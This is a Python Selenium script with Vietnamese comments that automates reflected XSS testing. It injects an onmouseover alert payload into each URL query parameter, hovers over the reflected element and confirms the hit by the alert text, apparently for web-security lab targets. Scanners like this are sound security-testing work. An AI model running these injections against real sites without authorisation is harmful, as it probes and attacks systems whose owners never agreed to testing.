import time
import random
import string
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse
from selenium.webdriver.remote.webdriver import WebDriver
# WebElement không còn cần thiết cho việc tìm kiếm chính
# from selenium.webdriver.remote.webelement import WebElement
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import NoSuchElementException, TimeoutException, StaleElementReferenceException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- Configuration ---
RANDOM_STRING_LENGTH = 15 # Độ dài cho chuỗi ngẫu nhiên trong alert
PAGE_LOAD_TIMEOUT = 10
ELEMENT_WAIT_TIMEOUT = 5  # Giảm thời gian chờ vì tìm kiếm trực tiếp hơn
ALERT_WAIT_TIMEOUT = 3    # Tăng nhẹ phòng trường hợp alert xuất hiện chậm
POST_ALERT_SLEEP = 0.5

# --- Helper Functions ---

def generate_random_string(length=RANDOM_STRING_LENGTH):
    """Tạo một chuỗi ngẫu nhiên chỉ gồm chữ cái và số."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def build_test_url(base_url: str, param_name: str, value: str) -> str:
    """
    Ghép thêm param_name=value vào base_url, tự động xử lý
    & hoặc ?, và URL encoding cho value.
    """
    parsed = urlparse(base_url)
    qlist = parse_qsl(parsed.query, keep_blank_values=True)
    qlist_updated = [(k, v) for k, v in qlist if k != param_name]
    qlist_updated.append((param_name, value))
    new_query = urlencode(qlist_updated)
    return urlunparse(parsed._replace(query=new_query))

# --- Core Test Function ---

def run_test(driver: WebDriver, target_url: str):
    """
    Kiểm tra Reflected XSS bằng cách tiêm trực tiếp payload
    'onmouseover="alert(RANDOM_STRING)"' vào TẤT CẢ các tham số query,
    tìm phần tử có thuộc tính này và kích hoạt mouseover.
    """
    print(f"\n--- Running Test: Direct Mouseover Payload Injection ---")
    print(f"Base URL: {target_url}")

    # --- Lấy Parameters từ URL ---
    try:
        parsed_url = urlparse(target_url)
        query_params_list = parse_qsl(parsed_url.query, keep_blank_values=True)
        param_names_to_test = sorted(list(set(key for key, value in query_params_list)))

        if not param_names_to_test:
            return False, f"No query parameters found in the URL: {target_url}"
        print(f"Found {len(param_names_to_test)} parameters to test: {', '.join(param_names_to_test)}")

    except Exception as e:
        return False, f"Error parsing URL '{target_url}' to get parameters: {e}"

    # --- Biến lưu kết quả tổng thể ---
    overall_vulnerability_found = False
    final_success_message = "No Mouseover XSS vulnerability found via direct payload injection in any parameter."

    # --- Vòng lặp qua từng tham số tìm được ---
    for current_param_name in param_names_to_test:
        print(f"\n{'='*15} Testing Parameter: '{current_param_name}' {'='*15}")

        # 1. Tạo Chuỗi Ngẫu Nhiên và Payload
        random_marker = generate_random_string()
        # Quan trọng: Payload cần được cấu trúc cẩn thận để hoạt động khi được phản chiếu
        # vào trong một thuộc tính HTML. Dấu nháy kép bên ngoài và dấu nháy đơn
        # bên trong alert thường là cách tiếp cận tốt.
        # Thêm một ký tự hoặc khoảng trắng ở đầu có thể giúp phá vỡ ngữ cảnh HTML hiện có.
        # Ví dụ: nếu tham số được phản chiếu vào <input value="PARAM_VALUE">
        # Payload: '" onmouseover="alert('RANDOM')"
        # Sẽ thành: <input value="" onmouseover="alert('RANDOM')""> -> Hợp lệ
        # payload_value = f"\" onmouseover=\"alert('{random_marker}')" # Cách 1
        # payload_value = f"ignored\" onmouseover=\"alert('{random_marker}')\"" # Cách 2, thêm dấu nháy ở cuối
        payload_value = f'"onmouseover="alert(\'{random_marker}\')' # Cách 3: dùng nháy đơn ngoài, kép trong alert
        print(f"Generated Random String: {random_marker}")
        print(f"Payload for URL parameter '{current_param_name}': {payload_value}")


        # 2. Tạo Attack URL
        attack_url = build_test_url(target_url, current_param_name, payload_value)
        print(f"Loading Attack URL: {attack_url}")

        try:
            driver.get(attack_url)
            WebDriverWait(driver, PAGE_LOAD_TIMEOUT).until(
                EC.presence_of_element_located((By.TAG_NAME, 'body'))
            )
            print("Attack URL loaded.")

            # 3. Tìm chính xác phần tử chứa payload trong thuộc tính onmouseover
            # Sử dụng XPath để tìm thuộc tính onmouseover có chứa alert với đúng random_marker
            # Lưu ý xử lý dấu nháy kép trong XPath và trong alert
            xpath_selector = f'//*[@onmouseover="alert(\'{random_marker}\')"]' # Nếu payload dùng nháy kép ngoài, đơn trong alert
            # xpath_selector = f"//*[@onmouseover='alert(\"{random_marker}\")']" # Nếu payload dùng nháy đơn ngoài, kép trong alert (phù hợp cách 3 ở trên)

            print(f"Searching for element using XPath: {xpath_selector}")
            element_to_hover = None
            try:
                # Đợi phần tử xuất hiện
                element_to_hover = WebDriverWait(driver, ELEMENT_WAIT_TIMEOUT).until(
                    EC.presence_of_element_located((By.XPATH, xpath_selector))
                )
                element_tag = element_to_hover.tag_name
                print(f"Found potential vulnerable element: <{element_tag}>")

            except TimeoutException:
                print(f"No element found with the exact onmouseover payload for param '{current_param_name}'.")
                continue # Chuyển sang tham số tiếp theo

            except Exception as find_err:
                print(f"Error finding element with payload for param '{current_param_name}': {find_err}")
                continue # Chuyển sang tham số tiếp theo

            # 4. Thực hiện Mouseover nếu tìm thấy phần tử
            if element_to_hover:
                try:
                    print(f"Performing mouseover on the found element <{element_tag}>...")
                    actions = ActionChains(driver)
                    # Đôi khi cuộn đến phần tử trước khi hover sẽ ổn định hơn
                    # actions.move_to_element(element_to_hover).perform() # Cách cũ
                    driver.execute_script("arguments[0].scrollIntoView(true);", element_to_hover)
                    time.sleep(0.5) # Chờ chút sau khi cuộn
                    actions.move_to_element(element_to_hover).perform()

                    print("Mouseover performed.")

                    # 5. Kiểm tra Alert và xác thực nội dung
                    try:
                        WebDriverWait(driver, ALERT_WAIT_TIMEOUT).until(EC.alert_is_present())
                        alert = driver.switch_to.alert
                        alert_text = alert.text
                        print(f"Alert detected! Text: '{alert_text}'")

                        # QUAN TRỌNG: So sánh text của alert với random_marker
                        if alert_text == random_marker:
                            print(f"  SUCCESS: Alert text matches the injected random string!")
                            alert.accept()
                            print(f"  Alert accepted. Sleeping {POST_ALERT_SLEEP}s...")
                            time.sleep(POST_ALERT_SLEEP)

                            # Xác nhận thành công và dừng kiểm tra
                            overall_vulnerability_found = True
                            final_success_message = (f"Direct Mouseover XSS SUCCESS!\n"
                                                   f"  Vulnerable Parameter: '{current_param_name}'\n"
                                                   f"  Payload Used (in URL): '{payload_value}'\n"
                                                   f"  Triggered Element: <{element_tag}>\n"
                                                   f"  Expected Alert Text: '{random_marker}'\n"
                                                   f"  Actual Alert Text: '{alert_text}'")
                            print(f"\n VULNERABILITY CONFIRMED for parameter '{current_param_name}'. Stopping further parameter tests.")
                            break # Dừng kiểm tra các THAM SỐ khác

                        else:
                            print(f"  WARNING: Alert text ('{alert_text}') does NOT match the expected random string ('{random_marker}'). Possible false positive or modification.")
                            alert.accept() # Vẫn đóng alert

                    except TimeoutException:
                        print("  No alert detected after mouseover.")
                    except Exception as alert_err:
                         print(f"  Error checking/handling alert: {alert_err}")

                except StaleElementReferenceException: print("Error: Element became stale before/during mouseover.")
                except Exception as interaction_err: print(f"Error during mouseover interaction: {interaction_err}")

        except Exception as page_load_err:
            print(f"Error loading attack URL or processing parameter '{current_param_name}': {page_load_err}")
            continue # Chuyển sang tham số tiếp theo nếu tải trang lỗi

        # Nếu đã tìm thấy lỗ hổng, thoát khỏi vòng lặp chính
        if overall_vulnerability_found:
            break

    # --- Kết quả cuối cùng ---
    if overall_vulnerability_found:
        print("\n--- Overall Test Result: Vulnerability Found ---")
        return True, final_success_message
    else:
        print("\n--- Overall Test Result: No Mouseover XSS vulnerability found via direct payload injection ---")
        return False, final_success_message

# ----- Ví dụ cách sử dụng (nếu chạy script trực tiếp) -----
if __name__ == "__main__":
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager

    options = webdriver.ChromeOptions()
    # options.add_argument('--headless') # Không nên dùng headless cho mouseover
    options.add_argument('--disable-gpu')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    # Giả lập user agent phổ biến
    options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')


    service = Service(ChromeDriverManager().install())
    driver = None

    # <<<<< THAY THẾ URL NÀY BẰNG URL LAB CỦA BẠN >>>>>
    # Ví dụ 1: URL gốc có tham số search
    # target_url_to_test = "https://0aa6004e03aeaea780a303f800e500d5.web-security-academy.net/?search=test"
    # Ví dụ 2: URL có tham số postId
    target_url_to_test = "https://0ae90064043862808046038800e00039.web-security-academy.net/post?postId=5"
    # Ví dụ 3: URL có nhiều tham số
    # target_url_to_test = "http://testphp.vulnweb.com/listproducts.php?cat=1&sort=name&view=details"

    try:
        print("Initializing WebDriver...")
        driver = webdriver.Chrome(service=service, options=options)
        print("WebDriver initialized.")

        # Gọi hàm test mới
        success, message = run_test(driver, target_url_to_test)

        print("\n====== FINAL TEST RESULT ======")
        print(f"Success (Vulnerability Found): {success}")
        print(f"Message:\n{message}") # Thêm newline để message dễ đọc hơn
        print("==============================")

    except Exception as e:
        print(f"\nAn critical error occurred during execution: {e}")
    finally:
        if driver:
            print("Quitting WebDriver...")
            driver.quit()
            print("WebDriver quit.")